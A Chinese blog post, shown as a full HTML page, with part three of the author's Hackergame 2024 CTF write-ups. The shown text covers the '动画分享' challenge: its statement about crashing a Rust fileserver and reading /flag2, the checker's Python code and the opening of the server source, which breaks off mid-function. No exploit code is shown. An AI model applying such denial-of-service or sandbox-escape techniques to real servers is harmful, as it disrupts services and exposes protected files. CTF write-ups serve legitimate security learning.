<!DOCTYPE html><html lang="[&quot;en-US&quot;,&quot;zh-CN&quot;,&quot;default&quot;]" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>Hackergame 2024 题解（三） | 逸风亭</title><meta name="author" content="WindShadow"><meta name="copyright" content="WindShadow"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="本文是Hackergame 2024 题解的第三部分。 动画分享查看题面为了给同学分享动画片，小 T 启动了自己之前用超安全的 Rust 语言写的 Web server，允许你访问「当前目录」的文件，当然了，flag 可不在当前目录。不过因为快到饭点了，小 T 还没来得及复制视频文件到对应的目录，于是就只在自己最常使用的、几年前编译的某祖传终端模拟器里面跑起了自己的 fileserver，然后就去">
<meta property="og:type" content="article">
<meta property="og:title" content="Hackergame 2024 题解（三）">
<meta property="og:url" content="https://blog.fyz666.xyz/blog/12196/">
<meta property="og:site_name" content="逸风亭">
<meta property="og:description" content="本文是Hackergame 2024 题解的第三部分。 动画分享查看题面为了给同学分享动画片，小 T 启动了自己之前用超安全的 Rust 语言写的 Web server，允许你访问「当前目录」的文件，当然了，flag 可不在当前目录。不过因为快到饭点了，小 T 还没来得及复制视频文件到对应的目录，于是就只在自己最常使用的、几年前编译的某祖传终端模拟器里面跑起了自己的 fileserver，然后就去">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blogfiles.oss.fyz666.xyz/webp/c49ffab9-5549-4d5b-b22e-287c109dfdeb.webp">
<meta property="article:published_time" content="2024-11-09T05:10:29.000Z">
<meta property="article:modified_time" content="2025-08-11T18:46:43.469Z">
<meta property="article:author" content="WindShadow">
<meta property="article:tag" content="Hackergame">
<meta property="article:tag" content="Hackergame 2024">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blogfiles.oss.fyz666.xyz/webp/c49ffab9-5549-4d5b-b22e-287c109dfdeb.webp"><link rel="shortcut icon" href="/images/avatar.webp"><link rel="canonical" href="https://blog.fyz666.xyz/blog/12196/"><link rel="preconnect" href="//fastly.jsdelivr.net"><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/js/vercount@v0.1.0.js"><meta name="google-site-verification" content="qs4w3HQcWsP2MnxYN-ccrDZXv8lbkIZ7FRTams_no7w"><meta name="baidu-site-verification" content="7a52f3352214d3debf7bdc94e16e4d98"><meta name="msvalidate.01" content="A886BA7ACEE7B91223E9CAC00117689A"><link rel="stylesheet" href="/css/index.72544d77.css?v=4.14.0-b1"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload='this.media="all"'><script>(()=>{const e={set:(e,t,o)=>{if(0===o)return;const n={value:t,expiry:Date.now()+864e5*o};localStorage.setItem(e,JSON.stringify(n))},get:e=>{const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!(Date.now()>o.expiry))return o.value;localStorage.removeItem(e)}};window.btf={saveToLocal:e,getScript:(e,t={})=>new Promise(((o,n)=>{const a=document.createElement("script");a.src=e,a.async=!0,a.onerror=n,a.onload=a.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(a.onload=a.onreadystatechange=null,o())},Object.keys(t).forEach((e=>{a.setAttribute(e,t[e])})),document.head.appendChild(a)})),getCSS:(e,t=!1)=>new Promise(((o,n)=>{const a=document.createElement("link");a.rel="stylesheet",a.href=e,t&&(a.id=t),a.onerror=n,a.onload=a.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(a.onload=a.onreadystatechange=null,o())},document.head.appendChild(a)})),addGlobalFn:(e,t,o=!1,n=window)=>{const a=n.globalFn||{},c=a[e]||{};o&&c[o]||(c[o=o||Object.keys(c).length]=t,a[e]=c,n.globalFn=a)}};const t=()=>{document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},o=()=>{document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","ffffff")};btf.activateDarkMode=t,btf.activateLightMode=o;const n=e.get("theme");"dark"===n?t():"light"===n&&o();const a=e.get("aside-status");void 0!==a&&("hide"===a?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})()</script><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?9a270e5172c0e106854227db797302be";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}(),btf.addGlobalFn("pjaxComplete",(()=>{_hmt.push(["_trackPageview",window.location.pathname])}),"baidu_analytics")</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-WYGVS01F3R"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-WYGVS01F3R"),btf.addGlobalFn("pjaxComplete",(()=>{gtag("config","G-WYGVS01F3R",{page_path:window.location.pathname})}),"google_analytics")</script><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:void 0,translate:{defaultEncoding:2,translateDelay:0,msgToTraditionalChinese:"繁",msgToSimplifiedChinese:"簡"},noticeOutdate:void 0,highlight:{plugin:"prismjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:300},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"天",dateSuffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:void 0,lightbox:"fancybox",Snackbar:{chs_to_cht:"你已切换为繁体中文",cht_to_chs:"你已切换为简体中文",day_to_night:"你已切换为深色模式",night_to_day:"你已切换为浅色模式",bgLight:"#49b1f5",bgDark:"#1f1f1f",position:"top-right"},infinitegrid:{js:"https://fastly.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js",buttonText:"加载更多"},isPhotoFigcaption:!1,islazyload:!0,isAnchor:!1,percent:{toc:!0,rightside:!1},autoDarkmode:!1,shortcut:{enable:!0,keyboard_delay:500,keyboard_css:"https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/css/keyboard.min.css",items:[{keycode:83,text:"S",action:"站内搜索",script:'$(".search").click()'},{keycode:32,text:"Space",action:"刷新页面",script:"pjax.loadUrl('')"},{keycode:82,text:"R",action:"随机文章",script:"toRandomPost()"},{keycode:38,text:"↑",action:"回到顶部",script:"btf.scrollToDest()"},{keycode:40,text:"↓",action:"前往评论区",script:"location.href='#post-comment'"},{keycode:37,text:"←",action:"回退页面",script:"history.back()"},{keycode:39,text:"→",action:"前进页面",script:"history.forward()"},{keycode:72,text:"H",action:"返回首页",script:"pjax.loadUrl('/')"},{keycode:65,text:"A",action:"关于博主",script:"pjax.loadUrl('/about/')"},{keycode:76,text:"L",action:"友情链接",script:"pjax.loadUrl('/link/')"},{keycode:68,text:"D",action:"浅色/深色切换",script:'$("#darkmode").click()'},{keycode:84,text:"T",action:"简体/繁体切换",script:'$("#translateLink").click()'},{keycode:67,text:"C",action:"显示/隐藏评论弹幕",script:"switchCommentBarrage()"},{keycode:77,text:"M",action:"播放/暂停音乐",script:"aplayers[0].toggle()"}]}}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"Hackergame 2024 题解（三）",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2025-08-12 02:46:43"}</script><style id="barragesColor"></style><script type="text/javascript" src="https://fastly.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script><script src="https://fastly.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js"></script><script src="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/js/rightmenu@v0.1.0.js" async></script><link rel="stylesheet" href="/css/iconfont.47c93876.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/css/rightmenu@v0.0.2.css"><script src="https://npm.elemecdn.com/echarts@4.9.0/dist/echarts.min.js"></script><script src="/js/charts.9263967d.js"></script><script src="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/js/githubcalendar@v0.0.2.js"></script><script type="text/javascript" src="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/js/comment-barrage.js"></script><script type="text/javascript" src="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/js/waterfall@v2.0.0.js"></script><script type="text/javascript" src="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/js/mytalk@v0.0.5.js"></script><script type="text/javascript" src="/js/random.a3a86860.js"></script><script type="text/javascript" src="/js/custom.3c08df65.js"></script><div id="keyboard-tips" style="display:none"><div class="keyboardTitle">快捷键</div><div class="keybordList"><div class="keybordItem"><div class="keyGroup"><div class="key">Shift + S</div></div><div class="keyContent"><div class="content">站内搜索</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">Shift + Space</div></div><div class="keyContent"><div class="content">刷新页面</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">Shift + R</div></div><div class="keyContent"><div class="content">随机文章</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">Shift + ↑</div></div><div class="keyContent"><div class="content">回到顶部</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">Shift + ↓</div></div><div class="keyContent"><div class="content">前往评论区</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">Shift + ←</div></div><div class="keyContent"><div class="content">回退页面</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">Shift + →</div></div><div class="keyContent"><div class="content">前进页面</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">Shift + H</div></div><div class="keyContent"><div class="content">返回首页</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">Shift + A</div></div><div class="keyContent"><div class="content">关于博主</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">Shift + L</div></div><div class="keyContent"><div class="content">友情链接</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">Shift + D</div></div><div class="keyContent"><div class="content">浅色/深色切换</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">Shift + T</div></div><div class="keyContent"><div class="content">简体/繁体切换</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">Shift + C</div></div><div class="keyContent"><div class="content">显示/隐藏评论弹幕</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">Shift + M</div></div><div class="keyContent"><div class="content">播放/暂停音乐</div></div></div></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/css/keyboard.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/css/swiper.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/css/swiper-style.css" media="print" onload='this.media="all"'><meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="逸风亭" type="application/atom+xml">
<link rel="alternate" href="/feed.xml" title="逸风亭" type="application/rss+xml">
</head><body><div id="loading-box"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script async>(()=>{const e=document.getElementById("loading-box"),d=document.body,o=()=>{d.style.overflow="",e.classList.add("loaded")},l=()=>{d.style.overflow="hidden",e.classList.remove("loaded")};l(),window.addEventListener("load",(()=>{o()})),setTimeout((function(){o()}),5e3),btf.addGlobalFn("pjaxSend",(()=>{l()}),"preloader_init"),btf.addGlobalFn("pjaxComplete",(()=>{o()}),"preloader_end")})()</script><script>window.paceOptions={restartOnPushState:!1},btf.addGlobalFn("pjaxSend",(()=>{Pace.restart()}),"pace_restart")</script><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/css/pace_progress_bar.css"><script src="https://fastly.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/avatar.webp" onerror='onerror=null,src="/images/default-link.png"' alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">170</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">105</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-blog"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="javascript:toRandomPost();"><i class="fa-fw fa fa-paper-plane"></i><span> 随便逛逛</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-sitemap"></i><span> 本站</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/gallery/"><i class="fa-fw far fa-images"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐馆</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-info-circle"></i><span> 关于我</span></a></li><li><a class="site-page child" href="/talk/"><i class="fa-fw far fa-comment-dots"></i><span> 说说</span></a></li><li><a class="site-page child" href="/equipment/"><i class="fa-fw fa-solid fa-toolbox"></i><span> 我的装备</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://status.fyz666.xyz/"><i class="fa-fw iconfont icon-monitor"></i><span> 状态监控</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-link"></i><span> 链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/fcircle/"><i class="fa-fw fab fa-galactic-republic"></i><span> 朋友圈</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-user-friends"></i><span> 友链</span></a></li><li><a class="site-page child" href="/tlink/"><i class="fa-fw fas fa-tools"></i><span> 工具</span></a></li><li><a class="site-page child" href="/rlink/"><i class="fa-fw fas fa-save"></i><span> 资源</span></a></li><li><a class="site-page child" href="/projects/"><i class="fa-fw fas fa-project-diagram"></i><span> 我的项目</span></a></li><li><a class="site-page child" href="/cfop/"><i class="fa-fw fa-solid fa-cube"></i><span> CFOP</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw iconfont icon-global"></i><span> 线路</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="https://blog.fyz666.xyz/" target="_blank" rel="noopener"><i class="fa-fw"></i><span> 主站点</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://gh.fyz666.xyz/"><span> GitHub</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://cf.fyz666.xyz/"><span> Cloudflare</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://vc.fyz666.xyz/"><span> Vercel</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://ntl.fyz666.xyz/"><span> Netlify</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://rd.fyz666.xyz/"><span> Render</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image:url('https://blogfiles.oss.fyz666.xyz/webp/c49ffab9-5549-4d5b-b22e-287c109dfdeb.webp')"><nav id="nav"><span id="blog-info"><a class="site-name" href="/" title="逸风亭">逸风亭</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-blog"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="javascript:toRandomPost();"><i class="fa-fw fa fa-paper-plane"></i><span> 随便逛逛</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-sitemap"></i><span> 本站</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/gallery/"><i class="fa-fw far fa-images"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐馆</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-info-circle"></i><span> 关于我</span></a></li><li><a class="site-page child" href="/talk/"><i class="fa-fw far fa-comment-dots"></i><span> 说说</span></a></li><li><a class="site-page child" href="/equipment/"><i class="fa-fw fa-solid fa-toolbox"></i><span> 我的装备</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://status.fyz666.xyz/"><i class="fa-fw iconfont icon-monitor"></i><span> 状态监控</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-link"></i><span> 链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/fcircle/"><i class="fa-fw fab fa-galactic-republic"></i><span> 朋友圈</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-user-friends"></i><span> 友链</span></a></li><li><a class="site-page child" href="/tlink/"><i class="fa-fw fas fa-tools"></i><span> 工具</span></a></li><li><a class="site-page child" href="/rlink/"><i class="fa-fw fas fa-save"></i><span> 资源</span></a></li><li><a class="site-page child" href="/projects/"><i class="fa-fw fas fa-project-diagram"></i><span> 我的项目</span></a></li><li><a class="site-page child" href="/cfop/"><i class="fa-fw fa-solid fa-cube"></i><span> CFOP</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw iconfont icon-global"></i><span> 线路</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="https://blog.fyz666.xyz/" target="_blank" rel="noopener"><i class="fa-fw"></i><span> 主站点</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://gh.fyz666.xyz/"><span> GitHub</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://cf.fyz666.xyz/"><span> Cloudflare</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://vc.fyz666.xyz/"><span> Vercel</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://ntl.fyz666.xyz/"><span> Netlify</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://rd.fyz666.xyz/"><span> Render</span></a></li></ul></div></div></div><div id="nav-right"><div class="menus_item"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></span></div></div><div class="menus_item"><div id="random"><a class="site-page social-icon" href="javascript:toRandomPost();" title="前往随机文章"><i class="fa fa-paper-plane"></i></a></div></div><div class="menus_item"><div id="travel"><a class="site-page social-icon" target="_blank" rel="noopener" href="https://travel.moe/go.html?travel=on" title="萌ICP备异次元之旅"><i class="iconfont icon-planet"></i></a></div></div><div class="menus_item"><div id="traveling"><a class="site-page social-icon" target="_blank" rel="noopener" href="https://www.travellings.cn/go.html" title="开往-友联接力"><i class="fa fa-subway"></i></a></div></div><div class="menus_item"><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></div></nav><div id="post-info"><h1 class="post-title">Hackergame 2024 题解（三）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2024-11-09T05:10:29.000Z" title="发表于 2024-11-09 13:10:29">2024-11-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf%E9%A2%98%E8%A7%A3/">CTF题解</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="Hackergame 2024 题解（三）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="vercount_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/blog/12196/#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div id="ai-container"><div id="ai-header"><div id="ai-title"><i class="fas fa-robot">&nbsp;</i><span>AI摘要</span><b id="ai-label"><a id="ai-link" target="_blank" rel="noopener" href="https://kimi.moonshot.cn/">Kimi Chat</a></b></div></div><div id="ai-content"></div></div><script>$(document).ready((function(){loadAbstract()}))</script><article class="post-content" id="article-container"><p>本文是Hackergame 2024 题解的第三部分。</p>
<h2 id="动画分享"><a href="#动画分享" class="headerlink" title="动画分享"></a>动画分享</h2><details class="toggle"><summary class="toggle-button">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>为了给同学分享动画片，小 T 启动了自己之前用超安全的 Rust 语言写的 Web server，允许你访问「当前目录」的文件，当然了，flag 可不在当前目录。不过因为快到饭点了，小 T 还没来得及复制视频文件到对应的目录，于是就只在自己最常使用的、<strong>几年前编译的某<del>祖传</del>终端模拟器</strong>里面跑起了自己的 <code>fileserver</code>，然后就去锁屏吃饭了。</p>
<p>小 T：「诶，我不过就分享个文件，而且目录里面也没别的东西，所以没关系吧～而且我特地搞了个 chroot，就算我真写出了什么漏洞，你也休想看到我的 flag！」</p>
<p>请提交一个程序，题目环境会在模拟小 T 的环境运行之后，降权运行你的程序：</p>
<ul>
<li>如果你能让小 T 的 <code>fileserver</code> 无法正常响应请求（例如让 <code>fileserver</code> 退出），你可以获得第一小题的 flag。</li>
<li>第二小题的 flag 在 <code>/flag2</code>，你需要想办法得到这个文件的内容。</li>
</ul>
<p>环境限制总 PID 数为 64。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E5%8A%A8%E7%94%BB%E5%88%86%E4%BA%AB/files/%E5%8A%A8%E7%94%BB%E5%88%86%E4%BA%AB.zip">本题附件</a></p>
</div>
</div></details>
<p>这道题是我觉得最有意思的题之一 <del>（别的大佬觉得有意思的题我不会）</del> 这也是我第一次利用现查的CVE去解题。</p>
<h3 id="只要不停下-HTTP-服务，响应就会不断延伸"><a href="#只要不停下-HTTP-服务，响应就会不断延伸" class="headerlink" title="只要不停下 HTTP 服务，响应就会不断延伸"></a>只要不停下 HTTP 服务，响应就会不断延伸</h3><p>我们要让小 T 的<code>fileserver</code>无法正常处理请求，即让下面函数返回<code>False</code>:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">health_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2.0</span><span class="token punctuation">)</span>

        sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        request <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"GET / HTTP/1.1\r\nConnection: close\r\n\r\n"</span></span>
        sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>request<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8192</span><span class="token punctuation">)</span>

        sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> <span class="token boolean">True</span>

    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token comment"># print(f"Error: &#123;e&#125;")</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们看到<code>fileserver</code>的源代码：</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span></span>fs<span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>io<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token class-name">Read</span><span class="token punctuation">,</span> <span class="token class-name">Write</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>net<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token class-name">TcpListener</span><span class="token punctuation">,</span> <span class="token class-name">TcpStream</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>path<span class="token punctuation">::</span></span><span class="token class-name">Path</span><span class="token punctuation">;</span>

<span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token namespace">std<span class="token punctuation">::</span>io<span class="token punctuation">::</span></span><span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> address <span class="token operator">=</span> <span class="token string">"127.0.0.1:8000"</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> listener <span class="token operator">=</span> <span class="token class-name">TcpListener</span><span class="token punctuation">::</span><span class="token function">bind</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Serving HTTP on &#123;&#125;"</span><span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> stream <span class="token keyword">in</span> listener<span class="token punctuation">.</span><span class="token function">incoming</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">match</span> stream <span class="token punctuation">&#123;</span>
            <span class="token class-name">Ok</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                <span class="token function">handle_connection</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token class-name">Err</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                <span class="token macro property">eprintln!</span><span class="token punctuation">(</span><span class="token string">"Connection failed: &#123;&#125;"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">fn</span> <span class="token function-definition function">handle_connection</span><span class="token punctuation">(</span><span class="token keyword">mut</span> stream<span class="token punctuation">:</span> <span class="token class-name">TcpStream</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> buffer <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
